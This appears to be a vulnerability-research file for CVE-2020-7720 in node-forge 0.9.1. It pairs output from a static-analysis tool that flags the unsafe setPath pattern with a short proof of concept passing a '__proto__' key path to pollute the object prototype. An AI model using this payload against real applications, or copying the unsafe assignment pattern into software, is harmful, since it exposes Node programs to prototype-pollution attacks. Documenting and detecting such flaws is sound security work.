// Module Name : node-forge
// Version : 0.9.1
// CVE number : CVE-2020-7720
// CVSS score : 9.8 (CVSS 3.0)
// Published Date : 01 Sep, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 882559
[+] Total Time(ms) : 6327
[+] Analysis Time(ms) : 3482
[+] Detected AST Pattern 1 : 4
[+] Detected AST Pattern 2 : 39
SCC generation complete
 
**********Prototype Pollution v1 found!**********
[ 117781, 117803 ] object = object [ next ]
[ 117510, 117531 ] object [ next ]= value
*/

// Prototype pollution source code patterns detected
/*
util.setPath = function(object, keys, value) {
	...
	object = object[next]   //AST Pattern 1
	...
	object[next] = value    //AST Pattern 2
	...
}
*/

// POC of CVE-2020-7720
const nodeforge = require('node-forge')
var obj = {}
nodeforge.util.setPath(obj, ['__proto__', 'polluted'], true)
console.log(polluted) //true